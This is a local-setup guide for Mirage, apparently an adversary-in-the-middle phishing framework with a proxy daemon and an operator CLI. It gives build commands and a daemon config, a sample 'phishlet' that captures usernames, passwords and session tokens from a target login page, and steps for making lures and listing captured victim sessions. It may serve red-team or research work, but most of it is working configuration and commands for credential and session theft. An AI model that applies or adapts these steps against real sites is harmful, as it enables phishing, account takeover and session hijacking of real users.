# Running Mirage Locally

This guide covers running both binaries on a single machine for local testing without a real domain or ACME certificates.

## Overview

Mirage is two binaries:

- **`miraged`** — the daemon (proxy, API, DNS)
- **`mirage`** — the operator CLI (talks to miraged over mTLS)

---

## 1. Build

```bash
make build
# produces build/miraged and build/mirage
```

---

## 2. Create directories and config

```bash
mkdir -p /tmp/mirage/{phishlets,data}
```

Create `/tmp/mirage/miraged.yaml`:

```yaml
domain: phish.local
external_ipv4: 127.0.0.1
https_port: 8443
dns_port: 5353
db_path: /tmp/mirage/data/data.db
phishlets_dir: /tmp/mirage/phishlets

self_signed: true

api:
  secret_hostname: api.phish.local
  client_ca_cert_path: /tmp/mirage/data/api-ca.crt
```

> Required fields: `domain`, `external_ipv4`, and `api.secret_hostname`. Everything else has defaults, but ports 443 and 53 need root — use 8443/5353 to run as a normal user. Set `self_signed: true` to skip ACME and use a locally generated CA instead.

---

## 3. Add a phishlet

Drop a phishlet YAML into `/tmp/mirage/phishlets/`. A minimal example targeting `example.com`:

```yaml
name: example
author: you
version: "1"

proxy_hosts:
  - phish_sub: login
    orig_sub:  login
    domain:    example.com
    is_landing: true

auth_tokens:
  - domain: ".example.com"
    keys:
      - name: session
        required: true

credentials:
  username:
    key: "^username$"
    search: "^(.+)$"
    type: post
  password:
    key: "^password$"
    search: "^(.+)$"
    type: post

login:
  domain: login.example.com
  path:   /login
```

---

## 4. Add /etc/hosts entries

Since there's no real DNS, point the phishing and API hostnames at localhost:

```bash
echo "127.0.0.1  login.phish.local  api.phish.local" | sudo tee -a /etc/hosts
```

---

## 5. Start miraged

```bash
./build/miraged --config /tmp/mirage/miraged.yaml --debug
```

On first run it will:

- Create a TLS CA at `/tmp/mirage/data/ca/mirage-ca.crt`
- Create an mTLS API CA at `/tmp/mirage/data/api-ca.crt`
- Issue an operator client cert at `/tmp/mirage/data/operator.crt` + `operator.key`
- Load any phishlets found in `phishlets_dir`

You should see `miraged ready` in the output.

---

## 6. Trust the self-signed CA in your browser

Import `/tmp/mirage/data/ca/mirage-ca.crt` as a trusted CA so the browser doesn't block requests to the phishing hostname.

- **Firefox:** Settings → Privacy & Security → View Certificates → Authorities → Import
- **Chrome:** Settings → Privacy and security → Security → Manage certificates → Authorities → Import

---

## 7. Register the server with the CLI

In a second terminal:

```bash
./build/mirage server add \
  --alias local \
  --address https://127.0.0.1:8443 \
  --secret-hostname api.phish.local \
  --cert /tmp/mirage/data/operator.crt \
  --key /tmp/mirage/data/operator.key \
  --ca-cert /tmp/mirage/data/api-ca.crt
```

This verifies the connection before saving. On success you'll see `Connected to miraged ... — endpoint saved as "local"`.

---

## 8. Enable the phishlet and create a lure

```bash
# Enable the phishlet on a hostname
./build/mirage phishlets enable example --hostname login.phish.local

# Create a lure (redirect URL is where victims land after token capture)
./build/mirage lures create example --redirect https://example.com

# Get the phishing URL
./build/mirage lures url <lure-id>
```

Visit the generated URL in a browser that trusts the CA. Sessions appear in:

```bash
./build/mirage sessions list
./build/mirage sessions list --completed
```

---

## File layout after first run

```txt
/tmp/mirage/
├── miraged.yaml
├── phishlets/
│   └── example.yaml
└── data/
    ├── data.db          # SQLite — sessions, lures, phishlet configs
    ├── ca/
    │   ├── mirage-ca.crt  # TLS CA — import into browser
    │   └── mirage-ca.key
    ├── api-ca.crt       # mTLS operator CA — used by CLI
    ├── api-ca.key
    ├── operator.crt     # operator client cert — used by CLI
    └── operator.key
```

---

## Tips

- Phishlet YAML files are hot-reloaded on save — no restart needed.
- Run `./build/miraged validate --config /tmp/mirage/miraged.yaml` to check your config without starting the daemon.
- `./build/mirage` with no subcommand drops into an interactive REPL.
- The CLI `--json` flag outputs raw JSON for scripting.
